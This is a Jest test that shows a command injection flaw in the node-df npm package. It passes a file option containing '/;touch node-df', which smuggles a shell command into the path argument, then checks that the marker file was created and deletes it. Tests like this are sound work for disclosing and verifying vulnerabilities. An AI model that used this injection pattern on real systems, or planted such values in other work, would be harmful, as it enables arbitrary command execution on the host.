test("Command Injection in node-df", (done) => {
  expect.assertions(2);
  const df = require("node-df");
  const fs = require("fs");
  const path = "./node-df";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: "/;touch node-df",
    prefixMultiplier: "GB",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };
  df(options, function (error, response) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
